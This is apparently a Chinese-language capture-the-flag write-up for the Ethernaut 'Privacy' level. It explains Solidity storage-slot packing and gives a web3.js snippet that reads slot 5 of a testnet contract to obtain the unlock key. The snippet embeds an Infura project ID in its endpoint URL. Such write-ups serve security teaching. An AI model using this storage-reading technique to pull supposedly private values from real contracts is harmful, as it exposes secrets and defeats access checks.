# Privacy

> 这个合约的制作者非常小心的保护了敏感区域的 storage.
>
> 解开这个合约来完成这一关.

## 源码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Privacy {

  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(now);
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) public {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}
```

## 攻击思路

解锁合约需要得到data[2]的前16个字节。在Privacy合约中的变量

```solidity
bool public locked = true;// locked占插槽0的1个字节，插槽0剩余31字节
uint256 public ID = block.timestamp;// 插槽0中只剩31个字节，不够ID存放，所以ID存放在插槽1中，占32个字节，插槽1已满
uint8 private flattening = 10;// flattening占插槽2的1个字节，插槽2剩余31字节
uint8 private denomination = 255;// denomination占插槽2的1个字节，插槽2剩余30字节
uint16 private awkwardness = uint16(now);// awkwardness占插槽2的2个字节，插槽2剩余29字节
bytes32[3] private data;// 插槽2剩余29字节，不够data存放，data[0]占满插槽3的32个字节，data[1]占满插槽4的32个字节，data[2]占满插槽5的32个字节
```

所以data[2]在插槽5中，只需要读取到插槽5的前16个字节即可解锁合约。

## 攻击代码

```solidity
//初始化基本对象
const Web3 = require('web3');
const web3 = new Web3(new Web3.providers.HttpProvider("https://rinkeby.infura.io/v3/4d7440b583e447f7b7d5630b038e0dc7"));

web3.eth.getStorageAt("0x299B8a1409Ae37F0ABBe5470e6694cFB7b39Eb2a", 5)// 取合约地址中第5个插槽中的数据
.then(console.log);
```

只需取得到的32个字节中的前16个字节即可。



在以太坊链上, 没有什么是私有的. private 关键词只是 solidity 中人为规定的一个结构. Web3 的 `getStorageAt(...)` 可以读取 storage 中的任何信息, 虽然有些数据读取的时候会比较麻烦. 因为 一些优化的技术和原则, 这些技术和原则是为了尽可能压缩 storage 使用的空间.

这不会比这个关卡中暴露的复杂太多. 更多的信息, 可以参见 "Darius" 写的这篇详细的文章: [How to read Ethereum contract storage](https://medium.com/aigang-network/how-to-read-ethereum-contract-storage-44252c8af925)